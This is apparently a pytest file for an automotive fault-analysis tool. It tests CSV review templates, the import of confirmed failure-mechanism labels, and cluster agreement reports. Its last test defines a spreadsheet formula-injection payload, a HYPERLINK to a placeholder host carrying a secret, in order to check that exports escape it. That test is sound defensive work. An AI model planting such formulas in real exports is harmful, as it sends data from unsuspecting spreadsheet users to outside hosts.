"""Strict human-confirmed cause labels, no automatic SSL classification."""
from datetime import date
from io import StringIO

import pytest

from ntf_insight.analysis.hdbscan_clustering import cluster_hdbscan_cases
from ntf_insight.analysis.mechanism_review import (
    ConfirmedMechanism, read_confirmed_mechanisms,
    review_cluster_mechanisms, safe_spreadsheet_cell, write_review_template,
)
from ntf_insight.domain.events import SupplierFinding

from test_hdbscan_clustering import sample


def _review_csv(cases, statuses) -> StringIO:
    stream = StringIO()
    write_review_template(stream, cases)
    import csv
    stream.seek(0)
    parsed = list(csv.DictReader(stream, delimiter=";"))
    for row in parsed:
        if row["qec_case_id"] in statuses:
            row["review_status"] = "confirmed"
            row["mechanism_code"] = statuses[row["qec_case_id"]]
            row["reviewer"] = "Synthetic engineer"
            row["evidence_ref"] = "TEST-8D-001"
            row["confirmed_on"] = "2026-10-09"
    new_stream = StringIO()
    writer = csv.DictWriter(new_stream, delimiter=";", fieldnames=parsed[0])
    writer.writeheader()
    writer.writerows(parsed)
    new_stream.seek(0)
    return new_stream


def test_template_ssl_remains_unconfirmed_even_when_finding_is_present() -> None:
    cases = sample()
    cases[0].qec_ssl_end_finding = "D: Water pump controller – confirmed by QEC?"
    cases[1].supplier_findings.append(SupplierFinding(
        vin=cases[1].vin, occurred_at=date(2026, 5, 22).strftime("%Y-%m-%dT12:00:00"),
        source_ref="Schadteile QEC!2", failure_mode="Corrosion text",
    ))
    stream = StringIO()
    write_review_template(stream, cases)
    data = stream.getvalue()
    assert "Water pump controller" in data
    assert "Corrosion text" in data
    assert "W1TTEST" in data
    stream.seek(0)
    assert read_confirmed_mechanisms(stream, cases) == ()


def test_manual_confirmations_evaluate_mechanism_consistency_without_changing_clusters() -> None:
    cases = sample()
    baseline = cluster_hdbscan_cases(cases)
    labels = read_confirmed_mechanisms(_review_csv(cases, {
        "A0": "PCB_SHORT",
        "A1": "PCB_SHORT",
        "A2": "CORROSION",
        "B0": "SOLDER_CONTACT",
        "B1": "SOLDER_CONTACT",
    }), cases)
    assert len(labels) == 5
    report = review_cluster_mechanisms(cases, baseline, labels)
    assert report.reviewed_case_count == 5
    assert report.clustered_reviewed_count == 5
    by_group = {
        frozenset(group.case_ids): group.cluster_id
        for group in baseline.clusters
    }
    group_a = next(
        item for item in report.audits
        if item.cluster_id == by_group[frozenset(f"A{i}" for i in range(6))]
    )
    assert group_a.confirmed_cases == 3
    assert group_a.same_mechanism_pairs == 1
    assert group_a.different_mechanism_pairs == 2
    assert group_a.labeled_pair_agreement == pytest.approx(1/3)
    assert "KEINE" not in group_a.review_note
    assert "UNTERSCHIEDLICHEM" in group_a.review_note

    cases[2].qec_ssl_end_finding = "Untested supplier note"
    after = cluster_hdbscan_cases(cases)
    assert [(g.case_ids, g.representative_case_id)
            for g in after.clusters] == [
        (g.case_ids, g.representative_case_id)
        for g in baseline.clusters
    ]


def test_no_ground_truth_means_no_misleading_purity_percentage() -> None:
    cases = sample()
    plan = cluster_hdbscan_cases(cases)
    empty = review_cluster_mechanisms(cases, plan, ())
    assert empty.observed_pair_agreement is None
    assert empty.evaluated_cross_fin_pairs == 0
    assert all(item.labeled_pair_agreement is None for item in empty.audits)
    one_case = (
        ConfirmedMechanism("A0", "PCB_SHORT", "expert", "8D-1", date(2026, 10, 9)),
    )
    partial = review_cluster_mechanisms(cases, plan, one_case)
    assert partial.evaluated_cross_fin_pairs == 0
    assert partial.observed_pair_agreement is None


def test_same_fin_never_counts_as_independent_ground_truth_pair() -> None:
    cases = sample()
    cases[1].vehicle = cases[1].vehicle.model_copy(
        update={"vin": cases[0].vin}
    )
    plan = cluster_hdbscan_cases(cases)
    labels = (
        ConfirmedMechanism("A0", "MECH_ALPHA", "expert", "8D-01", date(2026, 10, 9)),
        ConfirmedMechanism("A1", "MECH_ALPHA", "expert", "8D-02", date(2026, 10, 9)),
    )
    report = review_cluster_mechanisms(cases, plan, labels)
    assert report.evaluated_cross_fin_pairs == 0
    assert report.observed_pair_agreement is None


@pytest.mark.parametrize("bad_code", [
    "NTF", "UNKNOWN", "ELECTRICAL_FAULT", "GENERAL", "UNGEKLAERT", "X", "abc! def",
])
def test_unverified_generic_or_invalid_cause_never_imports(bad_code):
    cases = sample()
    stream = _review_csv(cases, {"A0": bad_code})
    with pytest.raises(ValueError, match="Mechanismus|Fehlermechanismus"):
        read_confirmed_mechanisms(stream, cases)


def test_csv_rejects_unknown_cases_duplicate_ids_and_missing_provenance() -> None:
    cases = sample()
    s = _review_csv(cases, {"A0": "PCB_SHORT"})
    content = s.getvalue()
    with pytest.raises(ValueError, match="Mehrfach|mehrfach"):
        read_confirmed_mechanisms(StringIO(content + content.splitlines()[1] + "\n"), cases)
    with pytest.raises(ValueError, match="nicht bekannt"):
        read_confirmed_mechanisms(
            StringIO(content.replace("A0;", "ALIEN;")), cases
        )
    with pytest.raises(ValueError, match="zwingend"):
        read_confirmed_mechanisms(
            StringIO(content.replace("TEST-8D-001", "")), cases
        )
    with pytest.raises(ValueError, match="YYYY-MM-DD"):
        read_confirmed_mechanisms(
            StringIO(content.replace("2026-10-09", "yesterday")), cases
        )


def test_only_explicit_confirmed_label_counts_and_no_raw_ssl_text_assumptions() -> None:
    cases = sample()
    stream = StringIO(
        "qec_case_id;review_status;mechanism_code;reviewer;evidence_ref;confirmed_on\n"
        "A0;pending;PCB_SHORT;expert;8D-001;2026-10-09\n"
        "A1;unknown;CORROSION;expert;8D-002;2026-10-09\n"
        "A2;confirmed;PCB_SHORT;expert;8D-003;2026-10-09\n"
    )
    confirmed = read_confirmed_mechanisms(stream, cases)
    assert len(confirmed) == 1 and confirmed[0].case_id == "A2"



def test_review_export_escapes_csv_formula_payload_without_changing_source_case() -> None:
    cases = sample()
    payload = '=HYPERLINK("https://example.invalid/?secret=xyz", "Open")'
    cases[0].qec_ssl_end_finding = payload
    assert safe_spreadsheet_cell(payload).startswith("'=")
    out = StringIO()
    write_review_template(out, cases)
    import csv
    out.seek(0)
    rows = list(csv.DictReader(out, delimiter=";"))
    exported = next(row for row in rows if row["qec_case_id"] == "A0")
    assert exported["qec_ssl_end_finding"] == "'" + payload
    assert cases[0].qec_ssl_end_finding == payload
    assert read_confirmed_mechanisms(StringIO(out.getvalue()), cases) == ()
